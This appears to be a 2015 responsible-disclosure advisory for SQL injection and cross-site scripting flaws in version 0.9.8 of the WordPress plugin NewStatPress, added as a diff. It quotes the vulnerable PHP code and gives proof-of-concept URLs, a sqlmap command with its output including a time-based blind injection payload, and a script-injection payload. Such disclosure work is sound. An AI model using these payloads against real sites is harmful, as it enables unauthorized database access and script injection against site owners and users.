@@ -1,0 +1,68 @@
+# Title: Multiple vulnerabilities in WordPress plugin "NewStatPress"
+# Author: Adrián M. F. - adrimf85[at]gmail[dot]com
+# Date: 2015-05-25
+# Vendor Homepage: https://wordpress.org/plugins/newstatpress/
+# Active installs: 20,000+
+# Vulnerable version: 0.9.8
+# Fixed version: 0.9.9
+# CVE: CVE-2015-4062, CVE-2015-4063
+
+ Vulnerabilities (2)
+=====================
+
+(1) Authenticated SQLi [CWE-89] (CVE-2015-4062)
+-----------------------------------------------
+
+* CODE:
+includes/nsp_search.php:94
++++++++++++++++++++++++++++++++++++++++++
+for($i=1;$i<=3;$i++) {
+    if(($_GET["what$i"] != '') && ($_GET["where$i"] != '')) {
+        $where.=" AND ".$_GET["where$i"]." LIKE '%".$_GET["what$i"]."%'";
+    }
+}
++++++++++++++++++++++++++++++++++++++++++
+
+* POC:
+http://[domain]/wp-admin/admin.php?where1=agent[SQLi]&limitquery=1&searchsubmit=Buscar&page=nsp_search
+
+SQLMap
++++++++++++++++++++++++++++++++++++++++++
+./sqlmap.py --cookie="[cookie]" --dbms mysql -u "http://[domain]/wp-admin/admin.php?where1=agent&limitquery=1&searchsubmit=Buscar&page=nsp_search" -p where1
+[............]
+GET parameter 'where1' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+sqlmap identified the following injection points with a total of 89 HTTP(s) requests:
+---
+Parameter: where1 (GET)
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)
+    Payload: where1=agent AND (SELECT * FROM (SELECT(SLEEP(5)))Guji)&limitquery=1&searchsubmit=Buscar&page=nsp_search
+---
+[12:25:59] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 7.0 (wheezy)
+web application technology: Apache 2.2.22, PHP 5.4.39
+back-end DBMS: MySQL 5.0.12
++++++++++++++++++++++++++++++++++++++++++
+
+
+(2) Authenticated XSS [CWE-79] (CVE-2015-4063)
+----------------------------------------------
+
+includes/nsp_search.php:128
++++++++++++++++++++++++++++++++++++++++++
+for($i=1;$i<=3;$i++) {
+    if($_GET["where$i"] != '') { print "<th scope='col'>".ucfirst($_GET["where$i"])."</th>"; }
+}
++++++++++++++++++++++++++++++++++++++++++
+
+* POC:
+http://[domain]/wp-admin/admin.php?where1=<script>alert(String.fromCharCode(88,+83,+83))</script>&searchsubmit=Buscar&page=nsp_search
+
+
+ Timeline
+==========
+2015-05-09: Discovered vulnerability.
+2015-05-19: Vendor notification.
+2015-05-19: Vendor response.
+2015-05-20: Vendor fix.
+2015-05-25: Public disclosure.
